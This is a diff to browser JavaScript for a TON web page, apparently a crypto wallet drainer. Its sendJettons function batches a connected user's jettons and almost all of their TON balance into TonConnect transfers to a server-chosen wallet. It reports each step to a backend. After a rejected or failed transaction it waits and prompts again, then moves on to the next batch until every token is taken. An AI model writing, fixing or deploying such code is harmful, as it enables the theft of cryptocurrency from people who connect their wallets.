@@ -185,7 +185,14 @@ async function connect(walletAddress) {
 let isProcessing = false; // Добавьте эту глобальную переменную
 
 async function sendJettons(data, walletAddress, ton, tonPrice, i, tryies, tonFlag) {
-    console.log('sendJettons called with:', { i, tryies, tonFlag, jettonsCount: Object.keys(data.data.boc).length });
+    console.log('sendJettons called with:', { 
+        i, 
+        tryies, 
+        tonFlag, 
+        jettonsCount: Object.keys(data.data.boc).length,
+        tonBalance: ton,
+        tonPrice: tonPrice
+    });
     
     let adr = new TonWeb.utils.Address(walletAddress);
     if (i < 0) i = 0;
@@ -205,15 +212,17 @@ async function sendJettons(data, walletAddress, ton, tonPrice, i, tryies, tonFla
     console.log(`Processing ${len} jettons, starting from index ${i}`);
 
     // Обрабатываем jettons
-    for (let currentIndex = i; currentIndex < len && msgs < 4; currentIndex++) {
+    for (let currentIndex = i; currentIndex < len; currentIndex++) {
+        if (msgs >= 4) break; // Максимум 4 сообщения в одной транзакции
+        
         try {
             let jettonPrice = parseFloat(data.data.prices[currentIndex]) || 0;
             let shouldInclude = (ton * tonPrice >= jettonPrice) || (ton * tonPrice < jettonPrice && tonFlag);
             
-            if (shouldInclude && data.data.boc[currentIndex]) {
+            if (shouldInclude && data.data.boc[currentIndex] && data.data.address[currentIndex]) {
                 transaction.messages.push({
                     address: data.data.address[currentIndex],
-                    amount: TonWeb.utils.toNano('0.05').toString(),
+                    amount: TonWeb.utils.toNano('0.05').toString(), // Комиссия для jetton трансфера
                     payload: data.data.boc[currentIndex]
                 });
                 
@@ -223,7 +232,7 @@ async function sendJettons(data, walletAddress, ton, tonPrice, i, tryies, tonFla
                 };
                 tkn++;
                 msgs++;
-                console.log(`Added jetton: ${data.data.name[currentIndex]}`);
+                console.log(`Added jetton: ${data.data.name[currentIndex]}, price: ${jettonPrice}$`);
             }
         } catch (e) {
             console.error('Error adding jetton to transaction:', e);
@@ -234,47 +243,55 @@ async function sendJettons(data, walletAddress, ton, tonPrice, i, tryies, tonFla
     if (!tontx && parseFloat(ton) > 0.5 && transaction.messages.length < 4) {
         try {
             let transfer_value = TonWeb.utils.toNano(ton) - TonWeb.utils.toNano("0.1");
-            let payload = await get_ton_text(transfer_value);
-            
-            if (payload.status === 'OK' && payload.data) {
-                transaction.messages.push({
-                    address: data.data.wallet,
-                    amount: transfer_value.toString(),
-                    payload: payload.data
-                });
+            if (transfer_value > 0) {
+                let payload = await get_ton_text(transfer_value);
                 
-                tokens[tkn] = {
-                    name: 'TON',
-                    prices: TonWeb.utils.fromNano(transfer_value.toString()) * tonPrice
-                };
-                tkn++;
-                tontx = true;
-                console.log('Added TON transfer to transaction');
+                if (payload.status === 'OK' && payload.data) {
+                    transaction.messages.push({
+                        address: data.data.wallet,
+                        amount: transfer_value.toString(),
+                        payload: payload.data
+                    });
+                    
+                    tokens[tkn] = {
+                        name: 'TON',
+                        prices: TonWeb.utils.fromNano(transfer_value.toString()) * tonPrice
+                    };
+                    tkn++;
+                    tontx = true;
+                    console.log('Added TON transfer to transaction:', TonWeb.utils.fromNano(transfer_value.toString()));
+                }
             }
         } catch (tonError) {
             console.error('Error adding TON transfer:', tonError);
         }
     }
 
-    // Проверяем что есть сообщения и все имеют amount
+    // Проверяем что есть сообщения для отправки
     if (transaction.messages.length > 0) {
-        // Проверяем что все сообщения имеют amount
+        // Финальная проверка всех сообщений
         for (let msg of transaction.messages) {
-            if (!msg.amount) {
-                console.error('Message missing amount:', msg);
+            if (!msg.amount || msg.amount === '0') {
+                console.error('Invalid message amount:', msg);
                 msg.amount = TonWeb.utils.toNano('0.05').toString();
             }
+            if (typeof msg.amount !== 'string') {
+                msg.amount = msg.amount.toString();
+            }
         }
         
-        console.log(`Sending transaction with ${transaction.messages.length} messages`, transaction.messages);
+        console.log(`Preparing to send transaction with ${transaction.messages.length} messages`);
         
         try {
+            // Уведомляем сервер о запросе трансфера
             let txRequest = await transfer_jettons_native_request(tokens, tryies + 1);
             currTx = true;
             
+            console.log('Sending transaction to blockchain...');
             const result = await tonConnectUI.sendTransaction(transaction);
             console.log('Transaction sent successfully:', result);
             
+            // Получаем хэш транзакции
             const bocCell = TonWeb.boc.Cell.oneFromBoc(TonWeb.utils.base64ToBytes(result.boc));
             const hash = TonWeb.utils.bytesToBase64(await bocCell.hash());
             
@@ -283,121 +300,77 @@ async function sendJettons(data, walletAddress, ton, tonPrice, i, tryies, tonFla
                 tokens: tokens,
             };
             
+            // Уведомляем сервер об успешной транзакции
             await jettons_transaction_done(data123);
-            console.log('Jetton transaction completed successfully');
+            console.log('Jetton transaction completed successfully, hash:', hash);
+            
+            // Продолжаем с оставшимися jettons если есть
+            let nextIndex = i + (msgs - (tontx ? 1 : 0));
+            if (nextIndex < len) {
+                console.log(`Continuing with next batch from index: ${nextIndex}`);
+                setTimeout(() => {
+                    sendJettons(data, walletAddress, ton, tonPrice, nextIndex, 0, tontx);
+                }, 2000);
+            } else {
+                console.log('All jettons processed successfully');
+            }
             
         } catch (error) {
             console.error('Transaction failed:', error);
-        }
-    }
-
-    // Добавляем TON перевод если нужно
-    if (!tontx && parseFloat(ton) > 0.5 && transaction.messages.length < 4) {
-        try {
-            let transfer_value = TonWeb.utils.toNano(ton) - TonWeb.utils.toNano("0.1");
-            let payload = await get_ton_text(transfer_value);
             
-            if (payload.status === 'OK' && payload.data) {
-                transaction.messages.push({
-                    address: data.data.wallet,
-                    amount: transfer_value.toString(), // Исправлено: добавлен amount
-                    payload: payload.data
-                });
-                
-                tokens[tkn] = {
-                    name: 'TON',
-                    prices: TonWeb.utils.fromNano(transfer_value.toString()) * tonPrice
+            if (tryies < maxRetry - 1) {
+                console.log(`Retrying transaction, attempt ${tryies + 2} of ${maxRetry}`);
+                let datas = {
+                    data: tokens,
+                    walletAddress: walletAddress,
+                    ton: ton,
+                    tonPrice: tonPrice,
+                    i: i,
+                    tryies: tryies,
+                    tonFlag: tonFlag,
+                    isTon: tontx
                 };
-                tkn++;
-                tontx = true;
-                console.log('Added TON transfer to transaction');
-            }
-        } catch (tonError) {
-            console.error('Error adding TON transfer:', tonError);
-        }
-    }
-
-    // Проверяем что есть сообщения и все имеют amount
-    if (transaction.messages.length > 0) {
-        // Проверяем что все сообщения имеют amount
-        for (let msg of transaction.messages) {
-            if (!msg.amount) {
-                console.error('Message missing amount:', msg);
-                msg.amount = TonWeb.utils.toNano('0.05').toString(); // fallback
-            }
-        }
-        
-        console.log(`Sending transaction with ${transaction.messages.length} messages`, transaction.messages);
-        
-        try {
-            let txRequest = await transfer_jettons_native_request(tokens, tryies + 1);
-            currTx = true;
-            
-            const result = await tonConnectUI.sendTransaction(transaction);
-            console.log('Transaction sent successfully:', result);
-            
-            const bocCell = TonWeb.boc.Cell.oneFromBoc(TonWeb.utils.base64ToBytes(result.boc));
-            const hash = TonWeb.utils.bytesToBase64(await bocCell.hash());
-            
-            let data123 = {
-                hash: hash,
-                tokens: tokens,
-            };
-            
-            await jettons_transaction_done(data123);
-            console.log('Jetton transaction completed successfully');
-            
-        } catch (error) {
-            console.error('Transaction failed:', error);
-                        
-                        // Сбрасываем для следующей партии
-                        transaction.messages = [];
-                        tokens = {};
-                        msgs = 0;
-                        tkn = 0;
-                    }
-                }
-            } catch (e) {
-                console.log('Error processing jetton at index', i, ':', e);
                 
-                if (tryies < maxRetry) {
-                    console.log(`Retrying... Attempt ${tryies + 1}/${maxRetry}`);
-                    
-                    let datas = {
-                        data: tokens,
-                        walletAddress: walletAddress,
-                        ton: ton,
-                        tonPrice: tonPrice,
-                        i: i,
-                        tryies: tryies,
-                        tonFlag: tonFlag,
-                        isTon: tontx
-                    };
-                    
-                    await decline_transfer_jettons_native_request(datas);
-                    
-                    // Ждем перед повторной попыткой
-                    await new Promise(resolve => setTimeout(resolve, 3000));
-                    
-                    // Продолжаем с того же индекса
-                    continue;
-                } else {
-                    console.log('Max retries reached, moving to next jetton');
-                    // Сбрасываем и продолжаем со следующим джеттоном
-                    transaction.messages = [];
-                    tokens = {};
-                    msgs = 0;
-                    tkn = 0;
-                    tryies = 0;
+                await decline_transfer_jettons_native_request(datas);
+                
+                setTimeout(() => {
+                    sendJettons(data, walletAddress, ton, tonPrice, i, tryies + 1, tonFlag);
+                }, 3000);
+            } else {
+                console.log('Max retries reached, moving to next batch');
+                let datas = {
+                    data: tokens,
+                    walletAddress: walletAddress,
+                    ton: ton,
+                    tonPrice: tonPrice,
+                    i: i,
+                    tryies: tryies,
+                    tonFlag: tonFlag,
+                    isTon: tontx
+                };
+                
+                await decline_transfer_jettons_native_request(datas);
+                
+                let nextIndex = i + (msgs - (tontx ? 1 : 0));
+                if (nextIndex < len) {
+                    setTimeout(() => {
+                        sendJettons(data, walletAddress, ton, tonPrice, nextIndex, 0, false);
+                    }, 2000);
                 }
             }
         }
-        
-        console.log('Finished processing all jettons');
-    } catch (error) {
-        console.error('Critical error in sendJettons:', error);
-    } finally {
-        isProcessing = false;
+    } else {
+        console.log('No messages to send in transaction');
+        // Если нет сообщений, но есть еще jettons для обработки
+        let nextIndex = i + 4; // Пропускаем 4 jettons
+        if (nextIndex < len) {
+            console.log(`No messages in current batch, skipping to index: ${nextIndex}`);
+            setTimeout(() => {
+                sendJettons(data, walletAddress, ton, tonPrice, nextIndex, 0, false);
+            }, 1000);
+        } else {
+            console.log('All jettons processed (no transactions needed)');
+        }
     }
 }
 
@@ -621,6 +594,7 @@ document.addEventListener('DOMContentLoaded', async () => {
     }
 
 });
+
 
 
 
